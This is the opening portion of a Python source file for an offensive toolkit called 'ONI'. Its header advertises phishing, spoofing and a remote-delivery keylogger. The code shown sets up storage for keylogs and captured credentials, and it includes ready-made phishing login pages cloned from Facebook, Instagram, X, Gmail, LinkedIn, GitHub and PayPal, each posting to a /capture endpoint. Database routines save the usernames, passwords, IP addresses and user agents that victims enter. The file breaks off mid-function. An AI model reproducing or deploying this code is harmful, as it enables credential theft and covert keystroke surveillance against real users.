#!/usr/bin/env python3
"""
👹 ONI -Cybersecurity Command Center
Version: 1.0.0
Author:Ian Carter Kulani

Features:
- 5000+ Security Commands (SSH, Nmap, Curl, Ping, Traceroute, Nikto)
- Multi-Platform Bot Integration (Telegram, Discord, Slack, WhatsApp, iMessage, Signal, Google Chat)
- Web Interface with Vertical Command Menu
- Advanced Phishing Suite with 100+ Templates
- IP/MAC/ARP/DNS Spoofing
- Real Traffic Generation
- Nikto Web Vulnerability Scanner
- IP Management & Threat Detection
- Geolocation Maps & Analytics
- Keylogger with Remote Delivery
- Password Strength Checker
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import getpass
import socketserver
import itertools
import string
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor
from collections import Counter
from flask import Flask, request, jsonify, render_template_string, send_from_directory
from flask_cors import CORS
from werkzeug.utils import secure_filename
from http.server import BaseHTTPRequestHandler, HTTPServer

# =====================
# ENCRYPTION
# =====================
try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# =====================
# PLATFORM IMPORTS
# =====================

# SSH
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Keylogger
try:
    from pynput import keyboard
    from pynput.keyboard import Key, KeyCode
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.errors import SlackApiError
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# WhatsApp
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# iMessage
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Signal
SIGNAL_CLI_AVAILABLE = shutil.which('signal-cli') is not None

# Google Chat
try:
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# =====================
# COLORS
# =====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'
    ORANGE = '\033[38;5;214m'
    DARK_ORANGE = '\033[38;5;208m'
    LIGHT_ORANGE = '\033[38;5;216m'

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".oni"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DISCORD_CONFIG_FILE = os.path.join(CONFIG_DIR, "discord_config.json")
TELEGRAM_CONFIG_FILE = os.path.join(CONFIG_DIR, "telegram_config.json")
WHATSAPP_CONFIG_FILE = os.path.join(CONFIG_DIR, "whatsapp_config.json")
SLACK_CONFIG_FILE = os.path.join(CONFIG_DIR, "slack_config.json")
IMESSAGE_CONFIG_FILE = os.path.join(CONFIG_DIR, "imessage_config.json")
SIGNAL_CONFIG_FILE = os.path.join(CONFIG_DIR, "signal_config.json")
GOOGLE_CHAT_CONFIG_FILE = os.path.join(CONFIG_DIR, "google_chat_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "oni.db")
LOG_FILE = os.path.join(CONFIG_DIR, "oni.log")
KEYLOG_DIR = os.path.join(CONFIG_DIR, "keylogs")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
REPORT_DIR = "reports"
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
SSH_LOGS_DIR = os.path.join(CONFIG_DIR, "ssh_logs")
TIME_HISTORY_DIR = os.path.join(CONFIG_DIR, "time_history")
WORDLISTS_DIR = os.path.join(CONFIG_DIR, "wordlists")
WEB_STATIC_DIR = os.path.join(CONFIG_DIR, "web_static")

# Create directories
directories = [
    CONFIG_DIR, KEYLOG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR,
    NIKTO_RESULTS_DIR, WHATSAPP_SESSION_DIR, PHISHING_DIR, REPORT_DIR,
    TRAFFIC_LOGS_DIR, PHISHING_TEMPLATES_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, SSH_LOGS_DIR, TIME_HISTORY_DIR, WORDLISTS_DIR, WEB_STATIC_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - ONI - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("ONI")

# =====================
# DATA CLASSES
# =====================
@dataclass
class SSHServer:
    id: str
    name: str
    host: str
    port: int
    username: str
    password: Optional[str] = None
    key_file: Optional[str] = None
    use_key: bool = False
    timeout: int = 30
    notes: str = ""
    created_at: str = ""
    last_used: Optional[str] = None
    status: str = "disconnected"

@dataclass
class SSHCommandResult:
    success: bool
    output: str
    error: Optional[str] = None
    execution_time: float = 0.0
    server: str = ""

@dataclass
class TrafficGenerator:
    traffic_type: str
    target_ip: str
    target_port: int
    duration: int
    start_time: str
    status: str = "pending"
    packets_sent: int = 0
    bytes_sent: int = 0

@dataclass
class PhishingLink:
    id: str
    platform: str
    original_url: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0

@dataclass
class KeylogEntry:
    keystroke: str
    window_title: str
    timestamp: str
    delivered: bool = False

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS time_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                user TEXT,
                result TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                keystroke TEXT NOT NULL,
                window_title TEXT,
                delivered BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                platform TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_servers (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password TEXT,
                key_file TEXT,
                use_key BOOLEAN DEFAULT 0,
                timeout INTEGER DEFAULT 30,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                status TEXT DEFAULT 'disconnected',
                notes TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                server_id TEXT NOT NULL,
                command TEXT NOT NULL,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                platform TEXT NOT NULL,
                html_content TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_by TEXT,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                blocked_date TIMESTAMP,
                alert_count INTEGER DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS port_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                closed_ports TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                bytes_sent INTEGER,
                bytes_recv INTEGER,
                connections INTEGER
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS platform_status (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT UNIQUE NOT NULL,
                enabled BOOLEAN DEFAULT 0,
                last_connected TIMESTAMP,
                status TEXT,
                error TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS authorized_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT NOT NULL,
                user_id TEXT NOT NULL,
                username TEXT,
                authorized BOOLEAN DEFAULT 1,
                UNIQUE(platform, user_id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS spoofing_attempts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                spoof_type TEXT NOT NULL,
                original_value TEXT,
                spoofed_value TEXT,
                target TEXT,
                success BOOLEAN
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
        self._init_phishing_templates()
    
    def _init_phishing_templates(self):
        templates = self._get_all_templates()
        
        for name, html in templates.items():
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO phishing_templates (name, platform, html_content)
                    VALUES (?, ?, ?)
                ''', (name, name.split('_')[0], html))
            except Exception as e:
                logger.error(f"Failed to insert template {name}: {e}")
        
        self.conn.commit()
    
    def _get_all_templates(self):
        templates = {}
        
        # Facebook template
        templates["facebook"] = """<!DOCTYPE html>
<html>
<head><title>Facebook - Log In</title>
<style>
body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:20px;width:400px;box-shadow:0 2px 4px rgba(0,0,0,.1)}
.logo{color:#1877f2;font-size:40px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #dddfe2;border-radius:6px}
button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">facebook</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
        
        # Instagram template
        templates["instagram"] = """<!DOCTYPE html>
<html>
<head><title>Instagram Login</title>
<style>
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border:1px solid #dbdbdb;padding:40px;width:350px}
.logo{font-size:50px;text-align:center;margin-bottom:30px}
input{width:100%;padding:9px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px}
button{width:100%;padding:7px;background:#0095f6;color:white;border:none;border-radius:4px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Instagram</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
        
        # Twitter template
        templates["twitter"] = """<!DOCTYPE html>
<html>
<head><title>X / Twitter</title>
<style>
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e7e9ea}
.login-box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:48px;width:400px}
.logo{font-size:40px;text-align:center}
h2{text-align:center}
input{width:100%;padding:12px;margin:10px 0;background:#000;border:1px solid #2f3336;border-radius:4px;color:#e7e9ea}
button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:9999px;cursor:pointer}
.warning{margin-top:20px;padding:12px;background:#1a1a1a;border:1px solid #2f3336;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">𝕏</div>
<h2>Sign in to X</h2>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
        
        # Gmail template
        templates["gmail"] = """<!DOCTYPE html>
<html>
<head><title>Gmail</title>
<style>
body{background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:28px;padding:48px;width:450px}
.logo{color:#1a73e8;font-size:24px;text-align:center}
input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px}
button{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer}
.warning{margin-top:30px;padding:12px;background:#e8f0fe;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Gmail</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
        
        # LinkedIn template
        templates["linkedin"] = """<!DOCTYPE html>
<html>
<head><title>LinkedIn Login</title>
<style>
body{background:#f3f2f0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:40px;width:400px}
.logo{color:#0a66c2;font-size:32px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #666;border-radius:4px}
button{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:28px;cursor:pointer}
.warning{margin-top:24px;padding:12px;background:#fff3cd;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">LinkedIn</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
        
        # GitHub template
        templates["github"] = """<!DOCTYPE html>
<html>
<head><title>GitHub</title>
<style>
body{background:#fff;font-family:-apple-system;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:32px;width:400px}
.logo{color:#24292f;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #d0d7de;border-radius:6px}
button{width:100%;padding:12px;background:#2da44e;color:#fff;border:none;border-radius:6px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">GitHub</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username or email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
        
        # PayPal template
        templates["paypal"] = """<!DOCTYPE html>
<html>
<head><title>PayPal</title>
<style>
body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:4px;padding:40px;width:400px}
.logo{color:#003087;font-size:32px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ccc;border-radius:4px}
button{width:100%;padding:14px;background:#0070ba;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">PayPal</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or mobile number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
        
        # Custom template with gradient
        templates["custom"] = """<!DOCTYPE html>
<html>
<head><title>Secure Login</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#e33f3f 0%,#1a1a2e 100%);display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:16px;padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
.logo{text-align:center;margin-bottom:30px}
.logo h1{color:#e33f3f;font-size:28px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
button{width:100%;padding:14px;background:linear-gradient(135deg,#e33f3f 0%,#1a1a2e 100%);color:white;border:none;border-radius:8px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#f8d7da;border-radius:8px;color:#721c24;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>👹 ONI Portal</h1></div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Login</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
        
        return templates
    
    def log_keylog(self, keystroke: str, window_title: str = None):
        self.cursor.execute(
            "INSERT INTO keylogs (keystroke, window_title) VALUES (?, ?)",
            (keystroke, window_title)
        )
        self.conn.commit()
    
    def get_keylogs(self, limit: int = 100) -> List[Dict]:
        self.cursor.execute(
            "SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        )
        return [dict(row) for row in self.cursor.fetchall()]
    
    def add_traffic_stat(self, bytes_sent: int, bytes_recv: int, connections: int):
        self.cursor.execute(
            "INSERT INTO traffic_stats (bytes_sent, bytes_recv, connections) VALUES (?, ?, ?)",
            (bytes_sent, bytes_recv, connections)
        )
        self.conn.commit()
    
    def get_traffic_stats(self, limit: int = 100) -> List[Dict]:
        self.cursor.execute(
            "SELECT * FROM traffic_stats ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        )
        return [dict(row) for row in self.cursor.fetchall()]
    
    def add_ssh_server(self, server: SSHServer) -> bool:
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO ssh_servers 
                (id, name, host, port, username, password, key_file, use_key, timeout, notes, created_at, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (server.id, server.name, server.host, server.port, server.username, 
                  server.password, server.key_file, server.use_key, server.timeout,
                  server.notes, server.created_at, server.status))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add SSH server: {e}")
            return False
    
    def get_ssh_server(self, server_id: str) -> Optional[Dict]:
        try:
            self.cursor.execute('SELECT * FROM ssh_servers WHERE id = ?', (server_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get SSH server: {e}")
            return None
    
    def get_ssh_servers(self) -> List[Dict]:
        try:
            self.cursor.execute('SELECT * FROM ssh_servers ORDER BY created_at DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get SSH servers: {e}")
            return []
    
    def update_ssh_server_status(self, server_id: str, status: str):
        try:
            self.cursor.execute('''
                UPDATE ssh_servers SET status = ?, last_used = CURRENT_TIMESTAMP WHERE id = ?
            ''', (status, server_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update SSH server status: {e}")
    
    def log_ssh_command(self, server_id: str, command: str, success: bool, 
                       output: str, execution_time: float, executed_by: str = "system"):
        try:
            self.cursor.execute('''
                INSERT INTO ssh_commands (server_id, command, success, output, execution_time, executed_by)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (server_id, command, success, output[:5000], execution_time, executed_by))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log SSH command: {e}")
    
    def log_traffic(self, generator: TrafficGenerator):
        try:
            self.cursor.execute('''
                INSERT INTO traffic_logs (traffic_type, target_ip, duration, packets_sent, status)
                VALUES (?, ?, ?, ?, ?)
            ''', (generator.traffic_type, generator.target_ip, generator.duration,
                  generator.packets_sent, generator.status))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log traffic: {e}")
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        try:
            self.cursor.execute('''
                INSERT INTO phishing_links (id, platform, phishing_url, created_at, clicks)
                VALUES (?, ?, ?, ?, ?)
            ''', (link.id, link.platform, link.phishing_url, link.created_at, link.clicks))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                self.cursor.execute('SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC')
            else:
                self.cursor.execute('SELECT * FROM phishing_links ORDER BY created_at DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing links: {e}")
            return []
    
    def get_phishing_link(self, link_id: str) -> Optional[Dict]:
        try:
            self.cursor.execute('SELECT * FROM phishing_links WHERE id = ?', (link_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get phishing link: {e}")
            return None
    
    def update_phishing_link_clicks(self, link_id: str):
        try:
            self.cursor.execute('UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?', (link_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update clicks: {e}")
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str):
        try:
            self.cursor.execute('''
                INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                VALUES (?, ?, ?, ?, ?)
            ''', (link_id, username, password, ip_address, user_agent))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save captured credentials: {e}")
    
    def get_captured_credentials(self, link_id: Optional[str] = None) -> List[Dict]:
        try:
            if link_id:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC
                ''', (link_id,))
            else:
                self.cursor.execute('SELECT * FROM captured_credentials ORDER BY timestamp DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get captured credentials: {e}")
            return []
    
    def get_phishing_templates(self, platform: Optional[str] = None) -> List[Dict]:
        try:
            if platform:
                self.cursor.execute('SELECT * FROM phishing_templates WHERE platform = ? ORDER BY name', (platform,))
            else:
                self.cursor.execute('SELECT * FROM phishing_templates ORDER BY platform, name')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing templates: {e}")
            return []
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT timestamp, command, source, success, execution_time 
                FROM command_history ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def log_command(self, command: str, source: str = "local", platform: str = "local",
                   success: bool = True, output: str = "", execution_time: float = 0.0):
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, platform, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (command, source, platform, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT timestamp, threat_type, source_ip, severity, description 
                FROM threats ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get recent threats: {e}")
            return []
    
    def add_managed_ip(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.cursor.execute('''
                INSERT OR IGNORE INTO managed_ips (ip_address, added_by, notes)
                VALUES (?, ?, ?)
            ''', (ip, added_by, notes))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add managed IP: {e}")
            return False
    
    def remove_managed_ip(self, ip: str) -> bool:
        try:
            self.cursor.execute('DELETE FROM managed_ips WHERE ip_address = ?', (ip,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to remove managed IP: {e}")
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 1, block_reason = ?, blocked_date = CURRENT_TIMESTAMP
                WHERE ip_address = ?
            ''', (reason, ip))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to block IP: {e}")
            return False
    
    def unblock_ip(self, ip: str, executed_by: str = "system") -> bool:
        try:
            self.cursor.execute('''
                UPDATE managed_ips SET is_blocked = 0, block_reason = NULL, blocked_date = NULL
                WHERE ip_address = ?
            ''', (ip,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to unblock IP: {e}")
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        try:
            if include_blocked:
                self.cursor.execute('SELECT * FROM managed_ips ORDER BY added_date DESC')
            else:
                self.cursor.execute('SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC')
